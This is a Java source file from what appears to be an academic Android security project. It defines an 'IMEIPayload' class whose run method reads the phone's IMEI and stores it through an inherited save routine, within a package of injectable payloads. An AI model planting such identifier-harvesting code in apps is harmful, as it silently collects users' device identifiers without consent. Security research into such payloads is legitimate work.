/*
 * Copyright 2015 
 * 	Danilo Cianciulli 			<cianciullidanilo@gmail.com>
 * 	Emranno Francesco Sannini 	<esannini@gmail.com>
 * 	Roberto Falzarano 			<robertofalzarano@gmail.com>
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * 
 *  http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package it.unisannio.srss.dame.android.payloads.imei;

import it.unisannio.srss.dame.android.payloads.Payload;
import android.content.Context;
import android.telephony.TelephonyManager;
import android.util.Log;

public class IMEIPayload extends Payload {

	public IMEIPayload(){
		super();
	}
	
	public IMEIPayload(Context context) {
		super(context);
	}

	//@Override
	public synchronized void run() {
		TelephonyManager tm = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		String imei = tm.getDeviceId();
		if (save(imei))
			Log.d(tag, "IMEI saved successful");
		else
			Log.e(tag, "Error while saving the payload output.");

	}
}
